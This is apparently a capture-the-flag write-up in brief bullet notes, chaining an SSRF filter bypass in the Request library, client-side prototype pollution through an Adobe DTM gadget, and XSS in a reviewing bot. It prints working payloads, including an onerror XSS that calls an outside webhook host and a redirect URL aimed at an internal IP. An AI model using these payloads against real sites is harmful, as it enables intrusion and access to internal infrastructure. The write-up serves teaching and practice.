+ ssrf filter is being used.
+ The request library is not latest.
So, according to the CVE:https://github.com/request/request/issues/3442
```
The Request library can be leveraged to initiate an HTTP / HTTPS connection and potentially gather information about the victim's internal infrastructure even if there's anti-SSRF filtering in place.
```
+ To do ssrf we need xss in the bot.
+ We have client side prototype pollution in /triage endpoint
`/triage?__proto__.test=test`
+ gadget: 
```
<script
      src="/public/js/launch-ENa21cfed3f06f4ddf9690de8077b39e81-development.min.js"
      async
```
+ According to Blackfan's repo:
We got the gadget: https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/adobe-dtm.md
+ `triage?__proto__[SRC]=<img/src/onerror%3dalert(1)>` This will give xss
+ We will give id,url and report as follows:
`{"id":"1","url":"asd","report":"1&__proto__[SRC]=<img/src/onerror%3dfetch(%27https://webhook.site/2e4ba32c-fabb-473c-945f-767fb2011b6e%27)>"}`
+ To bypass the ssrf filter:
`/check_valid_url?url=https://tellico.fun/redirect.php?target=http://172.31.0.2:5000/bounty`
+ Sending the above request along with auth-secret will give the flag
